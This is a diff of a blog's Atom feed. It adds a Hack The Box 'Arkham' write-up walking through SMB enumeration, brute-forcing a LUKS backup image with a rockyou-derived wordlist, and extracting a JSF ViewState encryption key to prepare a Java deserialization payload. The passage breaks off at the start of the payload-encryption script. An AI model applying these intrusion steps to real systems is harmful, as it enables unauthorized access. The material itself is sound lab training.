@@ -1,4 +1,777 @@
-<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.7.4">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2019-08-03T13:01:00+02:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">0xRick Owned Root !</title><subtitle>Infosec Blog , CTF and Hack The Box write-ups , articles and other stuff</subtitle><entry><title type="html">Hack The Box - Fortune</title><link href="http://localhost:4000/hack-the-box/fortune/" rel="alternate" type="text/html" title="Hack The Box - Fortune" /><published>2019-08-03T00:00:00+02:00</published><updated>2019-08-03T00:00:00+02:00</updated><id>http://localhost:4000/hack-the-box/fortune</id><content type="html" xml:base="http://localhost:4000/hack-the-box/fortune/">&lt;hr /&gt;
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.7.4">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2019-08-10T04:24:28+02:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">0xRick Owned Root !</title><subtitle>Infosec Blog , CTF and Hack The Box write-ups , articles and other stuff</subtitle><entry><title type="html">Hack The Box - Arkham</title><link href="http://localhost:4000/hack-the-box/arkham/" rel="alternate" type="text/html" title="Hack The Box - Arkham" /><published>2019-08-10T00:00:00+02:00</published><updated>2019-08-10T00:00:00+02:00</updated><id>http://localhost:4000/hack-the-box/arkham</id><content type="html" xml:base="http://localhost:4000/hack-the-box/arkham/">&lt;hr /&gt;
+
+&lt;h3 id=&quot;quick-summary&quot;&gt;Quick Summary&lt;/h3&gt;
+&lt;h4 id=&quot;hey-guys-today-arkham-retired-and-heres-my-write-up-about-it-this-box-was-a-challenging-one-and-i-enjoyed-it-a-lot-it-had-an-interesting-java-deserialization-vulnerability-which-is-the-best-thing-about-this-box-despite-the-fact-that-some-parts-were-annoying-this-box-was-great-its-a-windows-box-and-its-ip-is-101010130-i-added-it-to-etchosts-as-arkhamhtb-lets-jump-right-in-&quot;&gt;Hey guys today Arkham retired and here’s my write-up about it. This box was a challenging one and I enjoyed it a lot, it had an interesting java deserialization vulnerability which is the best thing about this box. Despite the fact that some parts were annoying, this box was great. It’s a Windows box and its ip is &lt;code class=&quot;highlighter-rouge&quot;&gt;10.10.10.130&lt;/code&gt;, I added it to &lt;code class=&quot;highlighter-rouge&quot;&gt;/etc/hosts&lt;/code&gt; as &lt;code class=&quot;highlighter-rouge&quot;&gt;arkham.htb&lt;/code&gt;. Let’s jump right in !&lt;/h4&gt;
+&lt;p&gt;&lt;img src=&quot;/images/hackthebox/arkham/0.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;hr /&gt;
+
+&lt;h3 id=&quot;nmap&quot;&gt;Nmap&lt;/h3&gt;
+&lt;h4 id=&quot;as-always-we-will-start-with-nmap-to-scan-for-open-ports-and-services-&quot;&gt;As always we will start with &lt;code class=&quot;highlighter-rouge&quot;&gt;nmap&lt;/code&gt; to scan for open ports and services :&lt;/h4&gt;
+&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;nmap -sV -sT -sC arkham.htb&lt;/code&gt;
+&lt;img src=&quot;/images/hackthebox/arkham/1.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;h4 id=&quot;we-have-http-on-port-80-8080-and-smb-i-checked-smb-first&quot;&gt;We have &lt;code class=&quot;highlighter-rouge&quot;&gt;http&lt;/code&gt; on port 80, 8080 and &lt;code class=&quot;highlighter-rouge&quot;&gt;smb&lt;/code&gt;, I checked &lt;code class=&quot;highlighter-rouge&quot;&gt;smb&lt;/code&gt; first.&lt;/h4&gt;
+&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
+&lt;hr /&gt;
+
+&lt;h3 id=&quot;smb&quot;&gt;SMB&lt;/h3&gt;
+&lt;h4 id=&quot;lets-use-smbclient-to-list-the-shares-&quot;&gt;Let’s use &lt;code class=&quot;highlighter-rouge&quot;&gt;smbclient&lt;/code&gt; to list the shares :&lt;/h4&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~/Desktop/HTB/boxes/arkham# smbclient --list //arkham.htb/ -U &quot;&quot;
+Enter WORKGROUP\'s password: 
+
+        Sharename       Type      Comment
+        ---------       ----      -------
+        ADMIN$          Disk      Remote Admin
+        BatShare        Disk      Master Wayne's secrets
+        C$              Disk      Default share
+        IPC$            IPC       Remote IPC
+        Users           Disk      
+Reconnecting with SMB1 for workgroup listing.
+do_connect: Connection to arkham.htb failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
+Failed to connect with SMB1 -- no workgroup available
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;h4 id=&quot;users-is-an-interesting-share-name-i-checked-it-and-it-had-the-directories-for-guest-and-default-users-&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;Users&lt;/code&gt; is an interesting share name, I checked it and it had the directories for &lt;code class=&quot;highlighter-rouge&quot;&gt;Guest&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;default&lt;/code&gt; users :&lt;/h4&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~/Desktop/HTB/boxes/arkham# smbclient //arkham.htb/Users/ -U &quot;&quot;
+Enter WORKGROUP\'s password: 
+Try &quot;help&quot; to get a list of possible commands.
+smb: \&amp;gt; ls
+  .                                  DR        0  Sun Feb  3 15:24:10 2019
+  ..                                 DR        0  Sun Feb  3 15:24:10 2019
+  Default                           DHR        0  Fri Feb  1 04:49:06 2019
+  desktop.ini                       AHS      174  Sat Sep 15 09:16:48 2018
+  Guest                               D        0  Sun Feb  3 15:24:19 2019
+
+                5158399 blocks of size 4096. 1899220 blocks available
+smb: \&amp;gt; 
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;h4 id=&quot;i-enumerated-it-for-some-time-but-i-couldnt-find-anything-useful-so-i-checked-batshare-which-had-a-zip-archive-called-appserverzip-&quot;&gt;I enumerated it for some time but I couldn’t find anything useful so I checked &lt;code class=&quot;highlighter-rouge&quot;&gt;BatShare&lt;/code&gt; which had a &lt;code class=&quot;highlighter-rouge&quot;&gt;zip&lt;/code&gt; archive called &lt;code class=&quot;highlighter-rouge&quot;&gt;appserver.zip&lt;/code&gt; :&lt;/h4&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~/Desktop/HTB/boxes/arkham# smbclient //arkham.htb/BatShare -U &quot;&quot;
+Enter WORKGROUP\'s password: 
+Try &quot;help&quot; to get a list of possible commands.
+smb: \&amp;gt; ls
+  .                                   D        0  Sun Feb  3 15:00:10 2019
+  ..                                  D        0  Sun Feb  3 15:00:10 2019
+  appserver.zip                       A  4046695  Fri Feb  1 08:13:37 2019
+
+                5158399 blocks of size 4096. 1897320 blocks available
+smb: \&amp;gt; 
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;h4 id=&quot;i-downloaded-it-get-appserverzip-then-i-started-to-examine-it&quot;&gt;I downloaded it (&lt;code class=&quot;highlighter-rouge&quot;&gt;get appserver.zip&lt;/code&gt;) then I started to examine it.&lt;/h4&gt;
+&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
+&lt;hr /&gt;
+
+&lt;h3 id=&quot;decrypting-the-backup-image-luks-encrypted-image&quot;&gt;Decrypting the Backup Image (LUKS Encrypted Image)&lt;/h3&gt;
+&lt;h4 id=&quot;after-unzipping-appserverzip-i-got-2-files-importanttxt-and-backupimg&quot;&gt;After unzipping &lt;code class=&quot;highlighter-rouge&quot;&gt;appserver.zip&lt;/code&gt; I got 2 files, &lt;code class=&quot;highlighter-rouge&quot;&gt;IMPORTANT.txt&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;backup.img&lt;/code&gt;&lt;/h4&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~/Desktop/HTB/boxes/arkham# mkdir appserver
+root@kali:~/Desktop/HTB/boxes/arkham# cd appserver/
+root@kali:~/Desktop/HTB/boxes/arkham/appserver# mv ../appserver.zip .
+root@kali:~/Desktop/HTB/boxes/arkham/appserver# unzip appserver.zip 
+Archive:  appserver.zip
+  inflating: IMPORTANT.txt           
+  inflating: backup.img              
+root@kali:~/Desktop/HTB/boxes/arkham/appserver# ls -la
+total 17276
+drwxr-xr-x 2 root root     4096 Aug  9 01:04 .
+drwxr-xr-x 3 root root     4096 Aug  9 01:04 ..
+-rw-r--r-- 1 root root  4046695 Aug  9 01:03 appserver.zip
+-rw-r--r-- 1 root root 13631488 Dec 25  2018 backup.img
+-rw-r--r-- 1 root root      149 Dec 25  2018 IMPORTANT.txt
+root@kali:~/Desktop/HTB/boxes/arkham/appserver# 
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;h4 id=&quot;importanttxt-was-a-note-from-bruce-to-alfred-telling-him-that-this-is-the-backup-image-from-their-linux-server-&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;IMPORTANT.txt&lt;/code&gt; was a note from &lt;code class=&quot;highlighter-rouge&quot;&gt;Bruce&lt;/code&gt; to &lt;code class=&quot;highlighter-rouge&quot;&gt;Alfred&lt;/code&gt; telling him that this is the backup image from their Linux server :&lt;/h4&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~/Desktop/HTB/boxes/arkham/appserver# cat IMPORTANT.txt 
+Alfred, this is the backup image from our linux server. Please see that The Joker or anyone else doesn't have unauthenticated access to it. - Bruce 
+root@kali:~/Desktop/HTB/boxes/arkham/appserver# 
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;h4 id=&quot;backupimg-was-a-luks-encrypted-image-&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;Backup.img&lt;/code&gt; was a &lt;code class=&quot;highlighter-rouge&quot;&gt;LUKS&lt;/code&gt; encrypted image :&lt;/h4&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~/Desktop/HTB/boxes/arkham/appserver# file backup.img 
+backup.img: LUKS encrypted file, ver 1 [aes, xts-plain64, sha256] UUID: d931ebb1-5edc-4453-8ab1-3d23bb85b38e
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;h4 id=&quot;we-can-attempt-to-open-it-with-cryptsetup-but-of-course-we-will-need-a-password-&quot;&gt;We can attempt to open it with &lt;code class=&quot;highlighter-rouge&quot;&gt;cryptsetup&lt;/code&gt; but of course we will need a password :&lt;/h4&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~/Desktop/HTB/boxes/arkham/appserver# cryptsetup open --type luks backup.img test
+Enter passphrase for backup.img:
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;h4 id=&quot;we-can-use-a-tool-called-bruteforce-luks-to-bruteforce-the-password-but-using-it-with-rockyou-would-take-a-very-long-time-the-box-so-far-has-a-lot-of-batman-references-like-the-names-alfred-bruce-joker--and-the-share-name-batshare-also-the-comment-of-that-share--master-waynes-secrets&quot;&gt;We can use a tool called &lt;code class=&quot;highlighter-rouge&quot;&gt;bruteforce-luks&lt;/code&gt; to bruteforce the password, but using it with &lt;code class=&quot;highlighter-rouge&quot;&gt;rockyou&lt;/code&gt; would take a very long time. The box so far has a lot of batman references, like the names &lt;code class=&quot;highlighter-rouge&quot;&gt;Alfred&lt;/code&gt;, &lt;code class=&quot;highlighter-rouge&quot;&gt;Bruce&lt;/code&gt;, &lt;code class=&quot;highlighter-rouge&quot;&gt;Joker&lt;/code&gt;  and the share name &lt;code class=&quot;highlighter-rouge&quot;&gt;BatShare&lt;/code&gt;, also the comment of that share : &lt;code class=&quot;highlighter-rouge&quot;&gt;Master Wayne's secrets&lt;/code&gt;.&lt;/h4&gt;
+&lt;h4 id=&quot;i-took-all-the-passwords-from-rockyou-that-had-batman-in-them-and-created-a-custom-list-&quot;&gt;I took all the passwords from &lt;code class=&quot;highlighter-rouge&quot;&gt;rockyou&lt;/code&gt; that had &lt;code class=&quot;highlighter-rouge&quot;&gt;batman&lt;/code&gt; in them and created a custom list :&lt;/h4&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~/Desktop/HTB/boxes/arkham/appserver# grep batman /usr/share/wordlists/rockyou.txt &amp;gt; list.txt
+root@kali:~/Desktop/HTB/boxes/arkham/appserver# bruteforce-luks -f ./list.txt ./backup.img 
+Warning: using dictionary mode, ignoring options -b, -e, -l, -m and -s.
+
+Tried passwords: 60
+Tried passwords per second: 0.361446
+Last tried password: batmanforever
+
+Password found: batmanforever
+root@kali:~/Desktop/HTB/boxes/arkham/appserver# 
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;h4 id=&quot;it-worked-and-the-password-was-batmanforever&quot;&gt;It worked and the password was &lt;code class=&quot;highlighter-rouge&quot;&gt;batmanforever&lt;/code&gt;.&lt;/h4&gt;
+&lt;p&gt;&lt;img src=&quot;/images/hackthebox/arkham/2.png&quot; alt=&quot;&quot; /&gt;
+&lt;br /&gt;
+&lt;br /&gt;
+&lt;img src=&quot;/images/hackthebox/arkham/3.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;h4 id=&quot;it-had-a-directory-called-mask-so-i-copied-it-then-i-unmounted-the-image&quot;&gt;It had a directory called &lt;code class=&quot;highlighter-rouge&quot;&gt;Mask&lt;/code&gt; so I copied it then I unmounted the image.&lt;/h4&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:/media/root/af474e94-894e-4bb6-897a-adc82884b3d8# ls -la
+total 18
+drwxr-xr-x  4 root root  1024 Dec 25  2018 .
+drwxr-x---+ 3 root root  4096 Aug  9 01:30 ..
+drwx------  2 root root 12288 Dec 25  2018 lost+found
+drwxrwxr-x  4 root root  1024 Dec 25  2018 Mask
+root@kali:/media/root/af474e94-894e-4bb6-897a-adc82884b3d8# cd -                             /root/Desktop/HTB/boxes/arkham/appserver
+root@kali:~/Desktop/HTB/boxes/arkham/appserver# cp -r /media/root/af474e94-894e-4bb6-897a-adc82884b3d8/Mask/ .
+root@kali:~/Desktop/HTB/boxes/arkham/appserver#
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;h4 id=&quot;there-were-some-useless-stuff-that-i-didnt-really-care-about-there-was-a-directory-called-tomcat-stuff-which-had-some-web-server-configuration-files-that-one-was-interesting&quot;&gt;There were some useless stuff that I didn’t really care about, there was a directory called &lt;code class=&quot;highlighter-rouge&quot;&gt;tomcat-stuff&lt;/code&gt; which had some web server configuration files, that one was interesting.&lt;/h4&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~/Desktop/HTB/boxes/arkham/appserver/Mask# ls -la
+total 896
+drwxr-xr-x 4 root root   4096 Aug  9 01:32 .
+drwxr-xr-x 3 root root   4096 Aug  9 01:32 ..
+drwxr-xr-x 2 root root   4096 Aug  9 01:32 docs
+-rw-r--r-- 1 root root  96978 Aug  9 01:32 joker.png
+-rw-r--r-- 1 root root 105374 Aug  9 01:32 me.jpg
+-rw-r--r-- 1 root root 687160 Aug  9 01:32 mycar.jpg
+-rw-r--r-- 1 root root   7586 Aug  9 01:32 robin.jpeg
+drwxr-xr-x 2 root root   4096 Aug  9 01:32 tomcat-stuff
+root@kali:~/Desktop/HTB/boxes/arkham/appserver/Mask# cd tomcat-stuff/
+root@kali:~/Desktop/HTB/boxes/arkham/appserver/Mask/tomcat-stuff# ls -la
+total 212
+drwxr-xr-x 2 root root   4096 Aug  9 01:32 .
+drwxr-xr-x 4 root root   4096 Aug  9 01:32 ..
+-rw-r--r-- 1 root root   1368 Aug  9 01:32 context.xml
+-rw-r--r-- 1 root root    832 Aug  9 01:32 faces-config.xml
+-rw-r--r-- 1 root root   1172 Aug  9 01:32 jaspic-providers.xml
+-rw-r--r-- 1 root root     39 Aug  9 01:32 MANIFEST.MF
+-rw-r--r-- 1 root root   7678 Aug  9 01:32 server.xml
+-rw-r--r-- 1 root root   2208 Aug  9 01:32 tomcat-users.xml
+-rw-r--r-- 1 root root 174021 Aug  9 01:32 web.xml
+-rw-r--r-- 1 root root   3498 Aug  9 01:32 web.xml.bak
+root@kali:~/Desktop/HTB/boxes/arkham/appserver/Mask/tomcat-stuff# cd ../docs
+root@kali:~/Desktop/HTB/boxes/arkham/appserver/Mask/docs# ls -la
+total 204
+drwxr-xr-x 2 root root   4096 Aug  9 01:32 .
+drwxr-xr-x 4 root root   4096 Aug  9 01:32 ..
+-rw-r--r-- 1 root root 199998 Aug  9 01:32 Batman-Begins.pdf
+root@kali:~/Desktop/HTB/boxes/arkham/appserver/Mask/docs# 
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;h4 id=&quot;we-have-the-server-configuration-files-however-we-havent-checked-any-of-the-http-ports-yet&quot;&gt;We have the server configuration files, However we haven’t checked any of the &lt;code class=&quot;highlighter-rouge&quot;&gt;http&lt;/code&gt; ports yet.&lt;/h4&gt;
+&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
+&lt;hr /&gt;
+
+&lt;h4 id=&quot;http-enumeration&quot;&gt;HTTP Enumeration&lt;/h4&gt;
+&lt;h4 id=&quot;port-80-had-nothing-running-there-was-only-the-default-iis-index-page-and-no-subdirectories&quot;&gt;Port 80 had nothing running, there was only the default &lt;code class=&quot;highlighter-rouge&quot;&gt;IIS&lt;/code&gt; index page and no subdirectories.&lt;/h4&gt;
+&lt;p&gt;&lt;img src=&quot;/images/hackthebox/arkham/4.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;h4 id=&quot;on-port-8080-there-was-a-website-with-some-links-&quot;&gt;On port 8080 there was a website with some links :&lt;/h4&gt;
+&lt;p&gt;&lt;img src=&quot;/images/hackthebox/arkham/5.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;h4 id=&quot;one-of-the-links-was-the-subscription-link--httparkhamhtb8080usersubscribefaces&quot;&gt;One of the links was the subscription link : &lt;code class=&quot;highlighter-rouge&quot;&gt;http://arkham.htb:8080/userSubscribe.faces&lt;/code&gt;&lt;/h4&gt;
+&lt;p&gt;&lt;img src=&quot;/images/hackthebox/arkham/6.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;h4 id=&quot;i-tested-it-to-see-what-will-happen-&quot;&gt;I tested it to see what will happen :&lt;/h4&gt;
+&lt;p&gt;&lt;img src=&quot;/images/hackthebox/arkham/7.png&quot; alt=&quot;&quot; /&gt;
+&lt;br /&gt;
+&lt;br /&gt;
+&lt;img src=&quot;/images/hackthebox/arkham/8.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;h4 id=&quot;nothing-interesting-i-intercepted-the-request-with-burp-and-found-some-interesting-parameters-in-the-post-request-&quot;&gt;Nothing interesting, I intercepted the request with &lt;code class=&quot;highlighter-rouge&quot;&gt;burp&lt;/code&gt; and found some interesting parameters in the POST request :&lt;/h4&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;POST /userSubscribe.faces HTTP/1.1
+Host: arkham.htb:8080
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: http://arkham.htb:8080/userSubscribe.faces
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 257
+Cookie: JSESSIONID=F018FBFC4605B1C80EB54D5CA2A46B91
+Connection: close
+Upgrade-Insecure-Requests: 1
+
+j_id_jsp_1623871077_1%3Aemail=test&amp;amp;j_id_jsp_1623871077_1%3Asubmit=SIGN+UP&amp;amp;j_id_jsp_1623871077_1_SUBMIT=1&amp;amp;javax.faces.ViewState=wHo0wmLu5ceItIi%2BI7XkEi1GAb4h12WZ894pA%2BZ4OH7bco2jXEy1RQxTqLYuokmO70KtDtngjDm0mNzA9qHjYerxo0jW7zu1mdKBXtxnT1RmnWUWTJyCuNcJuxE%3D
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
+&lt;hr /&gt;
+
+&lt;h3 id=&quot;jsf-viewstate-deserialization-vulnerability&quot;&gt;JSF ViewState Deserialization Vulnerability&lt;/h3&gt;
+&lt;h4 id=&quot;the-page-had-faces-extension-and-the-post-request-had-a-parameter-called-javaxfacesviewstate&quot;&gt;The page had &lt;code class=&quot;highlighter-rouge&quot;&gt;.faces&lt;/code&gt; extension and the POST request had a parameter called &lt;code class=&quot;highlighter-rouge&quot;&gt;javax.faces.ViewState&lt;/code&gt;.&lt;/h4&gt;
+&lt;h4 id=&quot;after-some-research-i-knew-that-this-parameter-holds-a-java-serialized-object-this-means-that-there-is-a-potential-deserialization-vulnerability&quot;&gt;After some research I knew that this parameter holds a java serialized object, this means that there is a potential deserialization vulnerability.&lt;/h4&gt;
+&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
+
+&lt;h4 id=&quot;some-resources-if-you-are-unfamiliar-with-deserialization-vulnerabilities-&quot;&gt;Some resources if you are unfamiliar with deserialization vulnerabilities :&lt;/h4&gt;
+&lt;ul&gt;
+  &lt;li&gt;
+    &lt;h4 id=&quot;misconfigured-jsf-viewstates-can-lead-to-severe-rce-vulnerabilities&quot;&gt;&lt;a href=&quot;https://www.alphabot.com/security/blog/2017/java/Misconfigured-JSF-ViewStates-can-lead-to-severe-RCE-vulnerabilities.html&quot;&gt;Misconfigured JSF ViewStates can lead to severe RCE vulnerabilities&lt;/a&gt;&lt;/h4&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;h4 id=&quot;exploiting-blind-java-deserialization-with-burp-and-ysoserial&quot;&gt;&lt;a href=&quot;https://www.n00py.io/2017/11/exploiting-blind-java-deserialization-with-burp-and-ysoserial/&quot;&gt;Exploiting blind Java deserialization with Burp and Ysoserial&lt;/a&gt;&lt;/h4&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;h4 id=&quot;how-i-found-a-1500-worth-deserialization-vulnerability&quot;&gt;&lt;a href=&quot;https://medium.com/@D0rkerDevil/how-i-found-a-1500-worth-deserialization-vulnerability-9ce753416e0a&quot;&gt;How i found a 1500$ worth Deserialization vulnerability&lt;/a&gt;&lt;/h4&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;h4 id=&quot;encrypted-java-serialized-rce-this-helped-me-to-know-how-to-encrypt-the-data&quot;&gt;&lt;a href=&quot;https://gist.github.com/cdowns71/76d99ad0829ceef3a83761dbeee3b66d&quot;&gt;Encrypted Java Serialized RCE&lt;/a&gt; (This helped me to know how to encrypt the data)&lt;/h4&gt;
+  &lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
+
+&lt;h4 id=&quot;when-i-tried-to-decode-the-base-64-encoded-value-i-got-nothing-readable&quot;&gt;When I tried to decode the base-64 encoded value I got nothing readable:&lt;/h4&gt;
+&lt;p&gt;&lt;img src=&quot;/images/hackthebox/arkham/9.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;h4 id=&quot;i-redirected-the-output-into-a-file-and-ran-file-command-against-it-and-i-got-data-instead-of-java-serialization-data&quot;&gt;I redirected the output into a file and ran &lt;code class=&quot;highlighter-rouge&quot;&gt;file&lt;/code&gt; command against it, and I got &lt;code class=&quot;highlighter-rouge&quot;&gt;data&lt;/code&gt; instead of &lt;code class=&quot;highlighter-rouge&quot;&gt;Java serialization data&lt;/code&gt;.&lt;/h4&gt;
+&lt;h4 id=&quot;this-means-that-the-serialized-data-are-encrypted-luckily-we-have-the-server-configuration-files-its-time-to-check-them&quot;&gt;This means that the serialized data are encrypted. Luckily we have the server configuration files, it’s time to check them.&lt;/h4&gt;
+&lt;h4 id=&quot;in-webxmlbak-i-found-the-key-used-to-encrypt-the-data-also-the-mac-algorithm-which-was-hmac-sha1-and-the-used-key&quot;&gt;In &lt;code class=&quot;highlighter-rouge&quot;&gt;web.xml.bak&lt;/code&gt; I found the key used to encrypt the data, also the MAC algorithm which was &lt;code class=&quot;highlighter-rouge&quot;&gt;hmac-sha1&lt;/code&gt; and the used key.&lt;/h4&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;    ----------------
+     Removed Output
+    ----------------
+&amp;lt;context-param&amp;gt;     
+
+&amp;lt;param-name&amp;gt;org.apache.myfaces.SECRET&amp;lt;/param-name&amp;gt;                                                                     
+&amp;lt;param-value&amp;gt;SnNGOTg3Ni0=&amp;lt;/param-value&amp;gt;                                                                                
+&amp;lt;/context-param&amp;gt;                                                                                                       
+    &amp;lt;context-param&amp;gt;                                                                                                    
+        &amp;lt;param-name&amp;gt;org.apache.myfaces.MAC_ALGORITHM&amp;lt;/param-name&amp;gt;                                                      
+        &amp;lt;param-value&amp;gt;HmacSHA1&amp;lt;/param-value&amp;gt;                                                                            
+     &amp;lt;/context-param&amp;gt;
+&amp;lt;context-param&amp;gt;
+&amp;lt;param-name&amp;gt;org.apache.myfaces.MAC_SECRET&amp;lt;/param-name&amp;gt;
+&amp;lt;param-value&amp;gt;SnNGOTg3Ni0=&amp;lt;/param-value&amp;gt;
+&amp;lt;/context-param&amp;gt;
+&amp;lt;context-param&amp;gt;
+    ----------------
+     Removed Output
+    ----------------
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;h4 id=&quot;the-same-key-was-used--snngotg3ni0-its-base-64-encoded-so-we-need-to-decode-it-&quot;&gt;The same key was used : &lt;code class=&quot;highlighter-rouge&quot;&gt;SnNGOTg3Ni0=&lt;/code&gt;, it’s base-64 encoded so we need to decode it :&lt;/h4&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~/Desktop/HTB/boxes/arkham# echo SnNGOTg3Ni0= | base64 -d
+JsF9876-
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;h4 id=&quot;the-key-is-jsf9876-&quot;&gt;The key is &lt;code class=&quot;highlighter-rouge&quot;&gt;JsF9876-&lt;/code&gt;.&lt;/h4&gt;
+&lt;h4 id=&quot;we-have-everything-we-need-to-encrypt-the-data-correctly-i-wrote-a-python-script-to-do-it&quot;&gt;We have everything we need to encrypt the data correctly, I wrote a python script to do it.&lt;/h4&gt;
+&lt;h4 id=&quot;basically-im-going-to-create-the-payload-with-ysoserial-then-use-my-script-to-encrypt-it&quot;&gt;Basically I’m going to create the payload with &lt;a href=&quot;https://github.com/frohoff/ysoserial&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;ysoserial&lt;/code&gt;&lt;/a&gt; then use my script to encrypt it.&lt;/h4&gt;
+&lt;h4 id=&quot;viewstatepy-&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;viewstate.py&lt;/code&gt; :&lt;/h4&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;#!/usr/bin/python3&lt;/span&gt;
+&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;sys&lt;/span&gt;
+&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;hmac&lt;/span&gt;
+&lt;span class=&quot;kn&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;urllib&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;parse&lt;/span&gt;
